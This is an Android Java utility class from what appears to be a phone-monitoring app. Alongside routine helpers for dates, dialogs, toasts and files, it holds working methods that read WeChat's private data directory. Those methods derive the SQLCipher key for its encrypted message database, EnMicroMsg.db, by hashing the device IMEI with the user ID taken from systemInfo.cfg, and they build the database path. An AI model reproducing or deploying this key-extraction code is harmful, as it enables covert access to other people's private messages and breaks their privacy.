/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  1:04:20 PM  Jun 6, 2013
 */
package com.hinj.app.utils;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.security.MessageDigest;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.res.AssetFileDescriptor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Gravity;
import android.widget.Toast;

/**
 * @author rajeevc
 *
 */

/**
 * Utility class
 */
public class Utility {
	private static String app = "aSQLMan";
	public static String CURRENT_PAGE=""; 
	/**
	 * 
	 */
	public Utility(){
		// TODO Auto-generated constructor stub
	}
	//checking network avalability
	public static boolean isNetworkAvailable(Context context) 
	{
		final ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		final NetworkInfo networkInfo = cm.getActiveNetworkInfo();	
		if (networkInfo != null && networkInfo.isConnected()) 
		{
			return true;
		}
		return false;
	}

	public static boolean isEmptyString(String text) 
	{
		return (text == null /*||isAlphaNumeric(text) */|| text.trim().length() <= 0);
	}

	public static Bitmap readBitmap(Uri selectedImage,Context ctx) {
		Bitmap bm = null;
		BitmapFactory.Options options = new BitmapFactory.Options();
		options.inSampleSize = 5;
		AssetFileDescriptor fileDescriptor =null;
		try {
			fileDescriptor = ctx.getContentResolver().openAssetFileDescriptor(selectedImage,"r");
		} catch (FileNotFoundException e) {
			e.printStackTrace();

		}
		finally{
			try {
				bm = BitmapFactory.decodeFileDescriptor(fileDescriptor.getFileDescriptor(), null, options);
				fileDescriptor.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return bm;
	} 

	public static String saveImage(Bitmap bm,int id)
	{
		//	file.createNewFile();

		File file=null;
		File folder=new File("/mnt/sdcard/cellpolice");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		try {
			file = new File(folder,"image"+id+".jpeg");
			//Log.e("Image Name",file.getName()+"  getTotalSpace  "+bm.getByteCount());
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fileOutputStream);		
			bm.compress(CompressFormat.JPEG,35,bos);	
			bos.flush();
			bos.close();

			bm.recycle();
			System.gc();


		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return file.getAbsolutePath();
	}

	public static void deleteFolder()
	{

		String fileSavePath="/mnt/sdcard/cellpolice";
		File Imagedirectory=new File(fileSavePath);

		if(Imagedirectory.exists())
		{
			final File[] files = Imagedirectory.listFiles();
			for (File f: files)
			{
				f.delete();
			}
			Imagedirectory.delete();
		}

	}

	public static String getDateTime(String gettime) {
		String result = "";
		try {
			// 2013-05-06 14:09:07
			SimpleDateFormat sourceFormat = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss");
			// sourceFormat.setTimeZone(TimeZone.getTimeZone("EST"));

			Date parsed = sourceFormat.parse(gettime);

			TimeZone tz = TimeZone.getDefault();
			SimpleDateFormat destFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm a");
			destFormat.setTimeZone(tz);

			result = destFormat.format(parsed);

		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}
	public static void customDialog(Context ctx,String Message){

		//dialog.getWindow().setTitle()
		AlertDialog dialog;
		Builder builder = new AlertDialog.Builder(ctx);
		builder.setMessage(Message);
		builder.setCancelable(true);
		builder.setPositiveButton("OK", new OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				// TODO Auto-generated method stub
				dialog.dismiss();
			}
		});
		dialog = builder.create();
		dialog.show();
	}
	//private static final String DATA_PATH = "/mnt/sdcard/com.tencent.mm";			// This should be replaced with real data path /data/data/com.tencent.mm
	private static final String DATA_PATH = "/data/data/com.tencent.mm";
	private static final String DB_FILE_NAME = "EnMicroMsg.db";
	
	/**
	 * Get sqlcipher decryption key
	 * @return decryption key string
	 */
	public static String getSQLCipherDecryptionKey(Context cont) {
		
		int userIDNumber = getUserIDNumber();
		
		//String deviceID = "355310046757567";			// Replace this with real device ID.
		TelephonyManager telephonyManager = (TelephonyManager)cont.getSystemService("phone");
		String deviceID = telephonyManager.getDeviceId();
		
		deviceID = deviceID.trim();
		String mixedString = deviceID + userIDNumber;
		byte[] devIDBytes = mixedString.getBytes();
		
		String resultKey = getHashCode(devIDBytes);
    
    return resultKey.substring(0, 7);
	}
	
	public static String getSQLiteDatabasePath() {
		byte[] userBytes = ("mm" + getUserIDNumber()).getBytes();
		String userHash = getHashCode(userBytes);
		
		return DATA_PATH + "/MicroMsg/" + userHash + "/" + DB_FILE_NAME;
	}

	private static int getUserIDNumber() {
		int userIDNumber = 0;
		// Read User ID Number from system config file.
		String systemInfoPath = DATA_PATH + "/MicroMsg/systemInfo.cfg";
		try {
			File file = new File(systemInfoPath);
			FileInputStream fileInputStream = new FileInputStream(file);
	    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
	    Map<Integer, Object> map = ((Map<Integer, Object>)objectInputStream.readObject());
	    objectInputStream.close();
	    fileInputStream.close();
	    
	    Integer uin = (Integer)map.get(Integer.valueOf(1));
	    userIDNumber = uin.intValue();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return userIDNumber;
	}
	public static String getHashCode(byte[] array) {
		char[] hexChars = new char[16];
		hexChars[0] = 48;
		hexChars[1] = 49;
		hexChars[2] = 50;
		hexChars[3] = 51;
		hexChars[4] = 52;
		hexChars[5] = 53;
		hexChars[6] = 54;
		hexChars[7] = 55;
		hexChars[8] = 56;
		hexChars[9] = 57;
		hexChars[10] = 97;
		hexChars[11] = 98;
		hexChars[12] = 99;
    hexChars[13] = 100;
    hexChars[14] = 101;
    hexChars[15] = 102;
    
    String resultKey = "";
    try {
	    MessageDigest digest = MessageDigest.getInstance("MD5");
	    digest.update(array);
	    byte[] digestBytes = digest.digest();
	    int len = digestBytes.length;
	    char[] resultArray = new char[len * 2];
	    for (int i = 0; i < len; i ++) {
	    	int val = digestBytes[i];
	    	resultArray[i * 2] = hexChars[(0xF & val >>> 4)];
	    	resultArray[i * 2 + 1] = hexChars[(val & 0xF)];
	    }
	    resultKey = new String(resultArray);
    } catch (Exception e) {
    	e.printStackTrace();
    	return "";
    }
    
    return resultKey;
	}
	/**
	 * Write a debug message to the log
	 * @param msg - The message
	 * @param logging - Only write to the log if logging = true
	 */
	public static void logD(String msg, boolean logging) {
		if (logging)
			Log.d(app, msg);
	}

	/**
	 * Write an error message to the log
	 * @param msg - The message
	 * @param logging - Only write to the log if logging = true
	 */
	public static void logE(String msg, boolean logging) {
		if (logging)
			if (msg != null)
				Log.e(app, msg);
			else
				Log.e(app, "Unknown error");
	}

	/**
	 * Display the message as a short toast message
	 * @param context
	 * @param msg - The message to display
	 */
	public static void toastMsg(Context context, String msg) {
		Toast toast = Toast.makeText(context, msg, Toast.LENGTH_SHORT);
		toast.setGravity(Gravity.BOTTOM | Gravity.CENTER, 0, 0);
		toast.show();
	}

	/**
	 * Test if a SDCard is available
	 * 
	 * @return true if a external SDCard is available
	 */
	public static boolean isSDAvailable() {
		String state = Environment.getExternalStorageState();
		if (Environment.MEDIA_MOUNTED.equals(state)) {
			return true;
		}
		return false;
	}

	/**
	 * Write an exceptions stack trace to the log 
	 * @param e - The exception
	 * @param logging - Only write to the log if logging = true
	 */
	public static void printStackTrace(Exception e, boolean logging) {
		if (logging)
			e.printStackTrace();
	}
	
	/**
	 * Add a / to the end of a String if it not end with /
	 * @param str - The String
	 * @return - The String ending with /
	 */
	public static String addSlashIfNotEnding(String str) {
		if (str != null) {
		if (!str.substring(str.length() - 1).equalsIgnoreCase("/")) {
			str += "/";
		}
		}
		return str;
	}

	/**
	 * Check a path if it is a valid existing directory
	 * @param path a path to test
	 * @return true if pat is a valid directory else false
	 */
	public static boolean isPathAValidDirectory(String path) {
		if (path == null)
			return false;
		File file = new File(path);
		if (!file.isDirectory())
		   return false;
		else
			return true;
	}
	/********Method For Remove file from Download folder*******/
	public static void deleteDownloadFolder(String fileName) {
		try {
			String fileSavePath = "/mnt/sdcard/downloads/"+fileName+".apk";
			File Imagedirectory = new File(fileSavePath);

			if (Imagedirectory.exists()) {
				final File[] files = Imagedirectory.listFiles();
				for (File f : files) {
					f.delete();
				}
				Imagedirectory.delete();
			} else {
				System.out.println("Folder not exist  ");
			}
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}

	}
    public static String getDirectory(String foldername) {
//      if (!foldername.startsWith(".")) {
//          foldername = "." + foldername;
//      }
      File directory = null;
      directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()
              + File.separator + foldername);
      if (!directory.exists()) {
          directory.mkdirs();
      }
      return directory.getAbsolutePath();
  }
    

	public static String getSimpleDateFormat(long longStampTime, String pattern) {
		SimpleDateFormat mdyFormat = new SimpleDateFormat(pattern,Locale.getDefault());

		// System.out.println(currentHour1%12 + ":" + currentMin1 + " " +
		// ((currentHour1>=12) ? "PM" : "AM"));
		return mdyFormat.format(new Date(longStampTime));
	}

	public static String getUTCDateFormat(long longStampTime, String pattern) {
		SimpleDateFormat mdyFormat = new SimpleDateFormat(pattern,Locale.getDefault());
		mdyFormat.setTimeZone(TimeZone.getTimeZone("UTC"));

		System.out.println(mdyFormat.format(new Date(longStampTime))); 
		
		return mdyFormat.format(new Date(longStampTime));
	}
	
	
	public static String[] getCurrentDate(int index) {
		String[] returnDateArray = new String[2];
		Calendar calender = Calendar.getInstance();

		calender.add(Calendar.DATE, index);
		// MM/DD/yyyy
		int mm = calender.get(Calendar.MONTH) + 1;

		String value1 = "";

		if (index == 0) {
			value1 = "Today";
		} else if (index == 1) {
			value1 = "Tomarrow";
		} else {
			value1 = "" + mm + "/" + calender.get(Calendar.DATE) + "/"
					+ calender.get(Calendar.YEAR);
		}

		returnDateArray[0] = value1;
		// returnDateArray[1] = getSimpleDateFormat(index);

		return returnDateArray;
	}

	public static String changeDateFormat(String matchDate, String format2) {
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS");//2014-10-29T14:45:00
		//yyyy-MM-dd'T'HH:mm:ss.SSS'Z'
		Date d1 = null;
		try {
			d1 = format.parse(matchDate);
		} catch (ParseException e) {
			e.printStackTrace();
		}

		long matchTimeMillis = d1.getTime();

		String formatedDate = getSimpleDateFormat(matchTimeMillis, format2).toString();
		return formatedDate;
	}
	
	public static String changeDateFormat2(String matchDate, String format2) {
		SimpleDateFormat format = new SimpleDateFormat("ddMMyyyyhhmmss"); 

		Date d1 = null;
		try {
			d1 = format.parse(matchDate);	//Tue Feb 20 00:05:10 GMT+05:30 1106
		} catch (ParseException e) {
			e.printStackTrace();
		}

		long matchTimeMillis = d1.getTime();//Tue Feb 20 11:05:07 CST 1106

		String formatedDate = getSimpleDateFormat(matchTimeMillis, format2).toString();
		return formatedDate;
	}

}
